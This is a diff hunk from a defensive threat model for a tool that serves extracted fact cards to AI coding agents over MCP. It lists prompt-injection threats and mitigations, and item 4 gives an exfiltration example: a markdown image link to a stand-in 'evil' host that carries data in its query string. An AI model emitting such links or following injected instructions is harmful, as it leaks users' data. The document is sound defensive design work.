@@ -16,7 +16,7 @@ Applications 2026, plus the ordinary web Top 10 for anything served over HTTP.
 2. **Injection into extraction.** Source text goes into the extraction prompt. → each utterance
    is wrapped in delimiters the system prompt calls data; closing tags inside the text are
    defused; control characters stripped; episode size capped.
-3. **Injection out to the consumer.** Fact cards reach Claude Code or Codex over MCP. → card
+3. **Injection out to the consumer.** Fact cards reach Claude Code or Codex over MCP (implemented: read-only stdio server, no tool takes a path, grant or write, enforced by a test; the notes it returns are labelled quoted data). → card
    text is marked as quoted data, instruction-like phrases are flagged, links from a flagged
    card are removed from answers in code, and the server is read-only.
 4. **Exfiltration through generated notes.** A note with `![](https://evil/?q=…)` leaks when
